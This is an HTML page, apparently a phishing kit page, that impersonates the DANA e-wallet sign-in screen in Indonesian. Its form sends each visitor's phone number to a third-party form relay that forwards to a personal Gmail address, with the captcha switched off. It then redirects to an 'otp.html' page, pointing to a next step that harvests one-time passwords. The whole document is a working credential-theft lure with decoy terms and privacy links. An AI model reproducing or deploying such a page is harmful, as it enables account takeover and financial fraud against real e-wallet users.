<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan Nomor DANA</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #008CFF;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    .logo {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 20px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    .input-group {
      display: flex;
    }
    .prefix {
      background-color: white;
      color: black;
      padding: 12px;
      border-radius: 8px 0 0 8px;
      font-weight: bold;
    }
    input[type="tel"] {
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 0 8px 8px 0;
      font-size: 18px;
    }
    button {
      background-color: white;
      color: #008CFF;
      border: none;
      padding: 14px;
      width: 100%;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }
    .desc {
      font-size: 14px;
      margin-top: 10px;
    }
    .desc a {
      color: white;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">DANA</div>
    <p>Masukkan nomor HP kamu untuk lanjut</p>
    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
      <div class="input-group">
        <div class="prefix">+62</div>
        <input type="tel" name="nomor_hp" placeholder="8112345678" required maxlength="13">
      </div>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="otp.html">
      <button type="submit">LANJUTKAN</button>
    </form>
    <p class="desc">
      Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
      Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&K</a> serta <a href="#">Kebijakan Privasi</a> kami.
    </p>
  </div>
</body>
</html>
